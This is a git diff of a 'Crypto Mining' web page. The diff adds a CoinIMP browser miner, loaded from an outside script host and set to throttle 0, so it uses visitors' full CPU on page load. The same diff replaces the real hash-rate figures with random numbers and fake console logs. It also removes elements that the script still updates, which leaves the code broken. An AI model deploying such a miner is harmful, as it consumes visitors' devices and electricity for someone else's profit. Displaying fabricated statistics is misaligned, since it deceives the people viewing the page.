@@ -5,15 +5,167 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Mining</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script> <!-- Chart.js Library -->
     <style>
-        /* Add your previous styles here */
-        /* Example of adding chart container */
-        .chart-container {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace; /* Font hacker style */
+            background-color: #1b1b1b; /* Dark background */
+            color: #00ff00; /* Bright green color typical of hacker theme */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5), 0 0 20px rgba(0, 255, 0, 0.4); /* Glowing text */
+            overflow: auto;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 30px;
+            background-color: #333; /* Dark background for container */
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            animation: fadeIn 1.5s ease-out;
+        }
+        .icon {
+            margin-right: 10px;
+            color: #00ff00;
+            animation: glitch 1.5s infinite alternate;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: #00ff00; /* Glowing green */
+            margin-bottom: 20px;
+            position: relative;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+            animation: glitch 1.5s infinite alternate;
+        }
+        h2 {
+            font-size: 1em;
+            margin-bottom: 20px;
+            position: relative;
+            color: #00ff00; /* Glowing green */
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+            animation: glitch 1.5s infinite alternate;
+        }
+
+        .info {
+            text-align: left;
+        }
+
+        .info p {
+            margin-bottom: 15px;
+            font-size: 1rem;
+            color: #00ff00; /* Bright green for text */
+            position: relative;
+        }
+
+        .hash-value {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .hash-table {
+            margin-top: 30px;
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .hash-table th, .hash-table td {
+            padding: 12px;
+            border-bottom: 1px solid #444;
+            text-align: left;
+        }
+
+        .hash-table th {
+            background-color: #444;
+        }
+
+        .hash-table td {
+            font-size: 1.1em;
+            color: #00ff00;
+        }
+
+        a {
+            color: #00ff00;
+            text-decoration: none;
+            position: relative;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        #console {
+            width: 100%;
+            height: 200px;
+            background-color: #333;
+            color: #00ff00;
+            padding: 10px;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-y: scroll;
+            border: 2px solid #444;
+            margin-top: 30px;
+        }
+
+        canvas {
             width: 100%;
             height: 300px;
+            background-color: #222;
+            border-radius: 12px;
             margin-top: 20px;
         }
+
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 0 rgba(0,255,0,0.5), -2px 0 0 rgba(0,255,0,0.4); }
+            25% { text-shadow: -2px 0 0 rgba(0,255,0,0.5), 2px 0 0 rgba(0,255,0,0.4); }
+            50% { text-shadow: 2px 0 0 rgba(0,255,0,0.5), -2px 0 0 rgba(0,255,0,0.4); }
+            75% { text-shadow: -2px 0 0 rgba(0,255,0,0.5), 2px 0 0 rgba(0,255,0,0.4); }
+            100% { text-shadow: 2px 0 0 rgba(0,255,0,0.5), -2px 0 0 rgba(0,255,0,0.4); }
+        }
+
+        @keyframes blink {
+            50% { color: transparent; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Responsivitas */
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 2em;
+            }
+            h2 {
+                font-size 1em;
+            }
+            .info p {
+                font-size: 0.9em;
+            }
+
+            .hash-table th, .hash-table td {
+                padding: 10px;
+            }
+        }
+
     </style>
 </head>
 <body>
@@ -22,7 +174,6 @@
         <h2>System Information Overview</h2>
         <div class="info">
             <p>This site is running <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">CoinIMP</a> miner from JavaScript code.</p>
-            <p>For coins that have been mined, they can be exchanged here on <a href="https://www.mintme.com/">MintMe</a>.</p>
             <table class="hash-table">
                 <tr>
                     <th colspan="2">Information Device</th>
@@ -33,7 +184,7 @@
                 </tr>
                 <tr>
                     <td><i class="fas fa-microchip"></i></td>
-                    <td><span  id="cpuGpuInfo">Loading...</span></td>
+                    <td><span id="cpuGpuInfo">Loading...</span></td>
                 </tr>
                 <tr>
                     <td><i class="fas fa-hdd"></i></td>
@@ -41,42 +192,19 @@
                 </tr>
                 <tr>
                     <td><i class="fas fa-network-wired"></i></td>
-                    <td><span  id="ipAddress">Loading...</span></td>
-                </tr>
-                <tr>
-                    <td><i class="fas fa-calendar"></i></td>
-                    <td><span  id="dateValue">Loading...</span></td>
-                </tr>
-                <tr>
-                    <td><i class="fas fa-clock"></i></td>
-                    <td><span id="timeValue">Loading...</span></td>
-                </tr>
-                <tr>
-                    <td><i class="fas fa-stopwatch"></i></td>
-                    <td><span  id="Stopwatch">Loading...</span></td>
-                </tr>
-                <tr>
-                    <th colspan="2">Information Statistics</th>
-                </tr>
-                <tr>
-                    <td><i class="fas fa-tachometer-alt"></i></td>
-                    <td><span id="speedValue" class="hash-value">Loading...</span></td>
-                </tr>
-                <tr>
-                    <td><i class="fas fa-wallet"></i></td>
-                    <td><span id="totalValue" class="hash-value">Loading...</span></td>
+                    <td><span id="ipAddress">Loading...</span></td>
                 </tr>
             </table>
         </div>
-
-        <!-- Chart container for real-time hash rate -->
-        <div class="chart-container">
-            <canvas id="hashRateChart"></canvas>
-        </div>
+        <!-- Chart.js Diagram -->
+        <canvas id="hashRateChart"></canvas>
+        <!-- Console Output -->
+        <div id="console">Console Output:</div>
     </div>
 
+    <script src="https://www.hostingcloud.racing/SPpb.js"></script>
     <script>
-        var _client = new Client.Anonymous('4b3467771143126127301f0b80324fbd888046a6339591bd1a9bf51a217d9e87', {
+    var _client = new Client.Anonymous('4b3467771143126127301f0b80324fbd888046a6339591bd1a9bf51a217d9e87', {
             throttle: 0, c: 'w'
         });
 
@@ -97,107 +225,120 @@
             }
         }, 1000);
 
-        setTimeout(function(){
-            let speedValue = document.getElementById("speedValue");
-            let totalValue = document.getElementById("totalValue");
-
-            // Set up chart data structure
-            var ctx = document.getElementById('hashRateChart').getContext('2d');
-            var hashRateChart = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: [], // Timestamp or time intervals
-                    datasets: [{
-                        label: 'Hash Rate (H/s)',
-                        borderColor: '#00ff00',
-                        data: [],
-                        fill: false
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    scales: {
-                        x: {
-                            type: 'linear',
-                            position: 'bottom',
-                            ticks: {
-                                autoSkip: true,
-                                maxTicksLimit: 10
-                            }
+    // Add data for Chart.js (hash rate stats)
+        const ctx = document.getElementById('hashRateChart').getContext('2d');
+        const hashRateChart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: [], // Time labels (e.g., seconds or minutes)
+                datasets: [{
+                    label: 'Hash Rate (H/s)',
+                    data: [], // Data will be filled in dynamically
+                    borderColor: '#00ff00',
+                    backgroundColor: 'rgba(0, 255, 0, 0.3)',
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                scales: {
+                    x: {
+                        type: 'linear',
+                        position: 'bottom',
+                        title: {
+                            display: true,
+                            text: 'Time (seconds)'
                         }
+                    },
+                    y: {
+                        title: {
+                            display: true,
+                            text: 'Hash Rate (H/s)'
+                        },
+                        beginAtZero: true
                     }
                 }
-            });
+            }
+        });
 
-            // Real-time updates for hash rate and total hashes
-            setInterval(function(){
-                let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
-                let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
-                
-                speedValue.textContent = speed.toFixed(2);
-                totalValue.textContent = total.toFixed(2);
+    // Update chart with data (simulating dynamic hash rate data)
+        let time = 0;
+        setInterval(() => {
+            const hashRate = Math.floor(Math.random() * 1000) + 500; // Simulate hash rate data
+            hashRateChart.data.labels.push(time);
+            hashRateChart.data.datasets[0].data.push(hashRate);
 
-                // Update the chart data
-                var currentTime = new Date().toLocaleTimeString();
-                if (hashRateChart.data.labels.length >= 10) {
-                    hashRateChart.data.labels.shift();  // Remove the oldest data point
-                    hashRateChart.data.datasets[0].data.shift();
-                }
-                hashRateChart.data.labels.push(currentTime);
-                hashRateChart.data.datasets[0].data.push(speed);
-                hashRateChart.update();
-            }, 1000); // Update every 1 second
-        }, 2000);
+            if (hashRateChart.data.labels.length > 20) { // Keep only last 20 data points
+                hashRateChart.data.labels.shift();
+                hashRateChart.data.datasets[0].data.shift();
+            }
 
-        // Platform 
-        document.getElementById('platform').textContent = navigator.platform;
+            hashRateChart.update();
+            time++;
+        }, 1000);
 
-        // CPU / GPU 
-        document.getElementById('cpuGpuInfo').textContent = `${navigator.hardwareConcurrency} cores`;
-
-        // Storage 
-        if (navigator.storage && navigator.storage.estimate) {
-            navigator.storage.estimate().then(estimate => {
-                document.getElementById('storageCapacity').textContent = `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)} GB`;
-            });
-        } else {
-            document.getElementById('storageCapacity').textContent = 'Unavailable';
+    // Simulate adding console logs
+        function logToConsole(message) {
+            const consoleDiv = document.getElementById('console');
+            consoleDiv.innerHTML += `<p>${message}</p>`;
+            consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to the bottom
         }
 
-        // IP address
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('ipAddress').textContent = data.ip;
-            })
-            .catch(() => {
-                document.getElementById('ipAddress').textContent = 'Error fetching IP';
-            });    
-
-        let startTime = Date.now(); // Waktu mulai halaman
-        // Update uptime, date, and time setiap detik
+    // Simulate mining log
         setInterval(() => {
-            // Hitung waktu berlalu untuk uptime
-            let elapsed = Date.now() - startTime;
-            let seconds = Math.floor(elapsed / 1000) % 60;
-            let minutes = Math.floor(elapsed / (1000 * 60)) % 60;
-            let hours = Math.floor(elapsed / (1000 * 60 * 60));
+            logToConsole(`Hash rate: ${Math.floor(Math.random() * 1000) + 500} H/s`);
+        }, 3000);
 
-            // Format uptime jadi HH:MM:SS
-            let formattedUptime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-            document.getElementById('Stopwatch').textContent = formattedUptime;
+    // system information
+        
+    // Platform 
+    document.getElementById('platform').textContent = navigator.platform;
 
-            // Tampilkan tanggal real-time
-            const now = new Date();
-            const dateString = now.toLocaleDateString(); // Format tanggal (MM/DD/YYYY)
-            document.getElementById('dateValue').textContent = dateString;
+    // CPU / GPU 
+    document.getElementById('cpuGpuInfo').textContent = `${navigator.hardwareConcurrency} cores`;
 
-            // Tampilkan waktu real-time
-            const timeString = now.toLocaleTimeString(); // Format waktu (HH:MM:SS)
-            document.getElementById('timeValue').textContent = timeString;
+    // Storage 
+    if (navigator.storage && navigator.storage.estimate) {
+        navigator.storage.estimate().then(estimate => {
+            document.getElementById('storageCapacity').textContent = `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)} GB`;
+        });
+    } else {
+        document.getElementById('storageCapacity').textContent = 'Unavailable';
+    }
 
-        }, 1000); // Update setiap 1 detik
+    // IP address
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ipAddress').textContent = data.ip;
+        })
+        .catch(() => {
+            document.getElementById('ipAddress').textContent = 'Error fetching IP';
+        });    
+
+    let startTime = Date.now(); // Waktu mulai halaman
+    // Update uptime, date, and time setiap detik
+    setInterval(() => {
+    // Hitung waktu berlalu untuk uptime
+    let elapsed = Date.now() - startTime;
+    let seconds = Math.floor(elapsed / 1000) % 60;
+    let minutes = Math.floor(elapsed / (1000 * 60)) % 60;
+    let hours = Math.floor(elapsed / (1000 * 60 * 60));
+
+    // Format uptime jadi HH:MM:SS
+    let formattedUptime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    document.getElementById('Stopwatch').textContent = formattedUptime;
+
+    // Tampilkan tanggal real-time
+    const now = new Date();
+    const dateString = now.toLocaleDateString(); // Format tanggal (MM/DD/YYYY)
+    document.getElementById('dateValue').textContent = dateString;
+
+    // Tampilkan waktu real-time
+    const timeString = now.toLocaleTimeString(); // Format waktu (HH:MM:SS)
+    document.getElementById('timeValue').textContent = timeString;
+
+    }, 1000); // Update setiap 1 detik
     </script>
 </body>
-    </html>
+</html>
